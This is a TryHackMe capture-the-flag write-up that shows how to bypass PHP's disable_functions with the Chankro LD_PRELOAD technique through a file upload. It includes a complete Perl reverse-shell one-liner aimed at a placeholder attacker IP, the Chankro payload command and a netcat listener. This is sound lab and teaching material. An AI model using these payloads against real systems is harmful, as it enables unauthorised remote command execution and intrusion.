# Bypass Disable Functions — TryHackMe

**Difficulty:** Easy 🌙  
**Platform:** TryHackMe

## 1. Introduction

The objective of this room is to compromise a vulnerable web server and retrieve the `flag.txt` file.

The main challenge is bypassing PHP's `disable_functions` restriction to execute system commands and obtain a reverse shell.

## 2. Initial Enumeration

After starting the machine, I inspected the web application and its file upload functionality.

The server was running Apache:

```text
Apache/2.4.18 (Ubuntu)
```

I also examined the PHP configuration to identify the disabled functions and determine the PHP environment.

Useful commands:

```bash
php -v
php -i | grep -E 'Server API|session.upload_progress.enabled'
```

Note that these commands inspect the CLI PHP configuration, which may differ from the PHP configuration used by the web server.

## 3. Bypassing PHP Disable Functions

The key to this challenge is **Chankro**.

Chankro abuses PHP's `putenv()` and the `LD_PRELOAD` environment variable to load a shared library into a process started by PHP.

The general idea is:

1. Upload a PHP script generated by Chankro.
2. The script writes a shared library and a payload to the target filesystem.
3. It sets the `LD_PRELOAD` environment variable.
4. It invokes PHP's `mail()` function, triggering the vulnerable execution path.
5. The shared library is loaded into the spawned process, allowing the payload to execute despite PHP's disabled command execution functions.

### Preparing the reverse shell

I prepared a reverse shell payload using Perl:

```bash
perl -e 'use Socket;$i="YOUR_VPN_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Replace `YOUR_VPN_IP` with the IP address of your TryHackMe VPN interface and make sure the port matches your listener.

### Generating the Chankro payload

```bash
python2 chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html/UPLOAD_DIRECTORY
```

The `--path` argument must point to the directory where the uploaded PHP file is stored on the target.

The architecture must match the target environment.

## 4. Uploading and Executing the Payload

After generating the PHP file, I uploaded it through the web application's file upload functionality.

Once uploaded, I started a Netcat listener:

```bash
nc -lvnp 4444
```

Then I accessed the uploaded PHP file through the browser:

```text
http://TARGET_IP/uploads/tryhackme.php
```

This triggered the payload and established a reverse shell.

## 5. Getting the Flag

After receiving the shell, I checked the current user:

```bash
whoami
```

Then I searched for the flag:

```bash
find / -name flag.txt 2>/dev/null
```

Finally, I read the file:

```bash
cat /path/to/flag.txt
```

## 6. Conclusion

This room demonstrates how PHP restrictions can sometimes be bypassed through the interaction between environment variables, dynamic library loading, and vulnerable process execution.

The important takeaway is that disabling functions such as `exec()` or `shell_exec()` does not necessarily eliminate every possible path to command execution.

**Key concepts:**
- PHP `disable_functions`
- `putenv()`
- `LD_PRELOAD`
- Shared libraries
- Chankro
- Reverse shells
- File upload vulnerabilities
